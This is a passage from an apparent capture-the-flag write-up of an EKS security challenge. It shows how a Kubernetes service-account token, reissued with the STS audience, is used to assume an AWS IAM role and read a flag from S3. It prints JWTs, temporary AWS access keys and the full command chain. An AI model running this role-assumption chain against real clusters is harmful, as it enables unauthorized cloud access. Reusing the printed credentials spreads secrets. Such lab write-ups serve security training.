eyJhbGciOiJSUzI1NiIsImtpZCI6IjUyNGI4MzMyZGNjYzQ2ZDE1MDFmMjQxZWE4ZGJjNWRkM2QzZmYwODEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc0NDQ2OTAxOCwiaWF0IjoxNzQ0NDY1NDE4LCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2U1Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlYnVnLXNhIiwidWlkIjoiNmNiNjAyNGEtYzRkYS00N2E5LTkwNTAtNTljOGM3MDc5OTA0In19LCJuYmYiOjE3NDQ0NjU0MTgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2U1OmRlYnVnLXNhIn0.PpafxIZcmSF_z7-5RDMnGlnpWHtsKpRnMyML2EvCE62lMHW4lb8A2onyu7cBn_qcVAKIkzvIST0lxPZb2SqQYqtpCMCzEQf-wiI-vgY7ssM2tGXr8LuX1FQR6lOwvoSYFmG-81hlYbnhGs1yCpwA2gjqiILf4HYhvOl59Aicp15Llj7a7E57eIcLxzeEI747Pc6QfPiQxts60fOUaRAk0jnTMobmQFVflzKRBom8GmLqFbszEZLbACPg_eX32O_zgZoO7uWJMXtisChJCWwfYhk7wJ5FJhMUVCF5s9nW0P_khim-b-kA1ENj9w7LJSXG8FJtbP9zCy4XC4KHa4OVsw
```

This is a JWT token which we need to decode on[ jwt.io ](https://jwt.io/)

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Lets use this token to assume the role&#x20;

<pre class="language-bash"><code class="lang-bash"><strong>> export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IjUyNGI4MzMyZGNjYzQ2ZDE1MDFmMjQxZWE4ZGJjNWRkM2QzZmYwODEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc0NDQ2OTAxOCwiaWF0IjoxNzQ0NDY1NDE4LCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2U1Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlYnVnLXNhIiwidWlkIjoiNmNiNjAyNGEtYzRkYS00N2E5LTkwNTAtNTljOGM3MDc5OTA0In19LCJuYmYiOjE3NDQ0NjU0MTgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2U1OmRlYnVnLXNhIn0.PpafxIZcmSF_z7-5RDMnGlnpWHtsKpRnMyML2EvCE62lMHW4lb8A2onyu7cBn_qcVAKIkzvIST0lxPZb2SqQYqtpCMCzEQf-wiI-vgY7ssM2tGXr8LuX1FQR6lOwvoSYFmG-81hlYbnhGs1yCpwA2gjqiILf4HYhvOl59Aicp15Llj7a7E57eIcLxzeEI747Pc6QfPiQxts60fOUaRAk0jnTMobmQFVflzKRBom8GmLqFbszEZLbACPg_eX32O_zgZoO7uWJMXtisChJCWwfYhk7wJ5FJhMUVCF5s9nW0P_khim-b-kA1ENj9w7LJSXG8FJtbP9zCy4XC4KHa4OVsw
</strong><strong>
</strong><strong>> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
</strong>An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience
</code></pre>

The above token will still have the default audience of the Kubernetes service. We can change that though with the `--audience` flag.

```bash
> kubectl create token debug-sa --audience=sts.amazonaws.com
eyJhbGciOiJSUzI1NiIsImtpZCI6IjUyNGI4MzMyZGNjYzQ2ZDE1MDFmMjQxZWE4ZGJjNWRkM2QzZmYwODEifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzQ0NDY5NDU1LCJpYXQiOjE3NDQ0NjU4NTUsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc0NDQ2NTg1NSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.qEUyL9upvc6IBpR_7fA-N1YgzM_mBcF7teRsg840ylE6OUZD6w-qZw_NdnfXF4S8NUROxpxoeJCywOAjya4WuGYDDbxMIM8BcP2o_9iu-QGX-uVIG2fo_tGTkcUNfTHNDxmaTy79LJiezjSYcpH8VBwsvnQ5VnpgpYHZRSVwqYQ27ld4iPe3fjdOyrS5M8GiT3AHW2Zf4Vz8fNu5ikzvPxIPazrYvL03cwWfAHESv3RzUI8H8l0MxCw9xoObz3M9-B5phmFynjjQM1ceA6Vki1_5L2I3Tpgvwot2fYu3BRpdFYTO5goE6rE_ejZeoikkx4dwWsSB3Z5jtja98eiq7g

> export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IjUyNGI4MzMyZGNjYzQ2ZDE1MDFmMjQxZWE4ZGJjNWRkM2QzZmYwODEifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzQ0NDY5NDU1LCJpYXQiOjE3NDQ0NjU4NTUsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc0NDQ2NTg1NSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.qEUyL9upvc6IBpR_7fA-N1YgzM_mBcF7teRsg840ylE6OUZD6w-qZw_NdnfXF4S8NUROxpxoeJCywOAjya4WuGYDDbxMIM8BcP2o_9iu-QGX-uVIG2fo_tGTkcUNfTHNDxmaTy79LJiezjSYcpH8VBwsvnQ5VnpgpYHZRSVwqYQ27ld4iPe3fjdOyrS5M8GiT3AHW2Zf4Vz8fNu5ikzvPxIPazrYvL03cwWfAHESv3RzUI8H8l0MxCw9xoObz3M9-B5phmFynjjQM1ceA6Vki1_5L2I3Tpgvwot2fYu3BRpdFYTO5goE6rE_ejZeoikkx4dwWsSB3Z5jtja98eiq7g

> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEVMQLMUK7CF",
        "SecretAccessKey": "9SHuNIIdT3ARdSSBq9A5/OufybtK52I/Vq6Gp9o0",
        "SessionToken": "IQoJb3JpZ2luX2VjEF4aCXVzLXdlc3QtMSJGMEQCICeDv6jRbe4LARogsfDlaoDOBK8x8CN9C3vuPfJ42xoYAiBNXjWz5msBVRpYVka+Ij+heyrkY3GhYkvLwgt5SUj0JSq+BAjX//////////8BEAEaDDY4ODY1NTI0NjY4MSIMYhLAKAGJxt3VHSVdKpIECp6lD+BWIB+1b/yA5Iz1KrA9f+4xVA1BSxn1GvBBJkJTzJB+M3LfVc1dJep9jSsWcAIhkUsxpFyI+KRemI5suR/qhrachj8OjEeDPoRoPz3c5nUFn45YMDbAnudbDFQQKTR0gorWB69i6DYXRYHR4LLoUj2ziTePeXzKzgggyW01k37R1WhPx0BmQhjtsBZ5tJDRCEDTO2XTs92WAi8xn3fKjHImQUD8KgdsXYzn22HTCwcUf6eemGitxq3b3lbaG8vtQ6JeZ4CNJ+6mwLpQrTmhFBDrbkJznHkzCRKQ4c6DmU4SJxZSLe5Z90qHFo8raVpKPu1noVMVq4nvEnqkAuhfw29NRbyO77RJdTC7Utee2UjyMPF6a1p4dnX+dvxPccsRxv7XehsPVqKxJsc1+ZPVSne3mv1wmKEJs+8dsFBiAM9QQz56d71ujFxmrtV8IUQqJc8koX9vnGcXTorydQP4du+x5KTja4q00yURwIF5FUeNpsviI7AjEsry2IsaSu1CpGHOPgTYwrrcyBWH3vm6Ze9AVhp99tQYpLM//+BXqT/gP/PWBLePgviG7rC2VUYEzAQ21cQUTUyFdwc2s0Q3Ze5jAHp0d2qyyxo5XiggIYZ0PKe7C1aa5474UcXFuIjRmeREwGAdlqYaTpaz8v487v/rxSzCq0aLJuaE7jDfZKNL+ZncGCYAfvs/V/W5zhAw3uDpvwY6lgFyZ+T9cs2+ddei24zb8OhZ+GSK5qnX8XqHozELuf1z5riOmhXdjIju37exrL9/WmbsFpE1xyvurKBx+n9bjjpm6mKA/2kOY0l7ItgUE2qScMT1rnEc4lajwVw0Rsd0sajrA+61FLimTt8PulQvwULeEtHijcAf1M2Ft69Gze/StgnrldxYBXvICkUTsYEohDM60GyLabQ=",
        "Expiration": "2025-04-12T14:53:34+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:test",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}

> export AWS_ACCESS_KEY_ID=ASIA2AVYNEVMQLMUK7CF
> export AWS_SECRET_ACCESS_KEY=9SHuNIIdT3ARdSSBq9A5/OufybtK52I/Vq6Gp9o0
> export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEF4aCXVzLXdlc3QtMSJGMEQCICeDv6jRbe4LARogsfDlaoDOBK8x8CN9C3vuPfJ42xoYAiBNXjWz5msBVRpYVka+Ij+heyrkY3GhYkvLwgt5SUj0JSq+BAjX//////////8BEAEaDDY4ODY1NTI0NjY4MSIMYhLAKAGJxt3VHSVdKpIECp6lD+BWIB+1b/yA5Iz1KrA9f+4xVA1BSxn1GvBBJkJTzJB+M3LfVc1dJep9jSsWcAIhkUsxpFyI+KRemI5suR/qhrachj8OjEeDPoRoPz3c5nUFn45YMDbAnudbDFQQKTR0gorWB69i6DYXRYHR4LLoUj2ziTePeXzKzgggyW01k37R1WhPx0BmQhjtsBZ5tJDRCEDTO2XTs92WAi8xn3fKjHImQUD8KgdsXYzn22HTCwcUf6eemGitxq3b3lbaG8vtQ6JeZ4CNJ+6mwLpQrTmhFBDrbkJznHkzCRKQ4c6DmU4SJxZSLe5Z90qHFo8raVpKPu1noVMVq4nvEnqkAuhfw29NRbyO77RJdTC7Utee2UjyMPF6a1p4dnX+dvxPccsRxv7XehsPVqKxJsc1+ZPVSne3mv1wmKEJs+8dsFBiAM9QQz56d71ujFxmrtV8IUQqJc8koX9vnGcXTorydQP4du+x5KTja4q00yURwIF5FUeNpsviI7AjEsry2IsaSu1CpGHOPgTYwrrcyBWH3vm6Ze9AVhp99tQYpLM//+BXqT/gP/PWBLePgviG7rC2VUYEzAQ21cQUTUyFdwc2s0Q3Ze5jAHp0d2qyyxo5XiggIYZ0PKe7C1aa5474UcXFuIjRmeREwGAdlqYaTpaz8v487v/rxSzCq0aLJuaE7jDfZKNL+ZncGCYAfvs/V/W5zhAw3uDpvwY6lgFyZ+T9cs2+ddei24zb8OhZ+GSK5qnX8XqHozELuf1z5riOmhXdjIju37exrL9/WmbsFpE1xyvurKBx+n9bjjpm6mKA/2kOY0l7ItgUE2qScMT1rnEc4lajwVw0Rsd0sajrA+61FLimTt8PulQvwULeEtHijcAf1M2Ft69Gze/StgnrldxYBXvICkUTsYEohDM60GyLabQ=

> aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:test",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"
}
```

From the IAM policy we know the flag is at `challenge-flag-bucket-3ff1ae2/flag`&#x20;

```bash
> aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag -
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
```

<figure><img src="../../.gitbook/assets/EKS Cluster.png" alt=""><figcaption></figcaption></figure>
